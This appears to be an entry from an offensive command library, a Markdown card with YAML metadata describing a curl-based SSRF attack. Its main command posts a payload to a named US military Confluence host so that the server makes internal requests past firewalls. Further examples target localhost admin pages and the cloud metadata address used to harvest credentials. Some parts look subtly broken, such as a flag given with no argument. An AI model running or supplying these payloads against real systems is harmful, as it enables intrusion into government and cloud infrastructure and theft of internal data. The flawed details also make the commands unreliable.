---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X POST "https://target-confluence.dod.mil/plugins/servlet/ssrf-vuln" -d
  "internal_url=http://internal-ip:port/service"
tags:
  - ssrf
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:13.106Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-payload

## Command

```bash
curl -X POST "https://target-confluence.dod.mil/plugins/servlet/ssrf-vuln" -d "internal_url=http://internal-ip:port/service"
```

## Description

Sends a POST request with an SSRF payload to the vulnerable Confluence endpoint, forcing an internal request to bypass firewalls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| URL | Vulnerable endpoint | Yes |
| `-d` | Payload data with internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://target.com/vuln" -d "url=http://localhost/admin"
```

### Advanced Usage

```bash
curl -X POST "https://target.com/vuln" -d "url=http://169.254.169.254/meta-data/" --data-urlencode
```

## Expected Output

Internal service response or error data leaked in the output.

## Related

- [[Related Procedure]]
